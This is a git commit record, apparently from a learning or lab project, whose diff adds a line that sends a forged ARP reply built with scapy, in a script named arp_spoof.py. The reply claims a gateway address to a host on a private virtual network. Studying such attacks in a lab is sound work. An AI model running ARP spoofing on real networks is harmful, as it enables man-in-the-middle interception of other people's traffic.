258bd2dbf6e939697f0bf54b30542b36c9911f57
iskry <refocuslucifer@protonmail.com>
2023-08-20 21:10:26 -0400

    used scapy module to send ARP response

--- arp_spoof.py
+++ arp_spoof.py
@@ -4,3 +4,4 @@ import scapy.all as scapy
 
 #op is set to 2 which is for ARP response. the default option, 1, is for ARP request
 packet = scapy.ARP(op=2, pdst="192.168.122.11", hwdst="52:54:00:c5:e7:b6", psrc="192.168.122.1")
+scapy.send(packet)
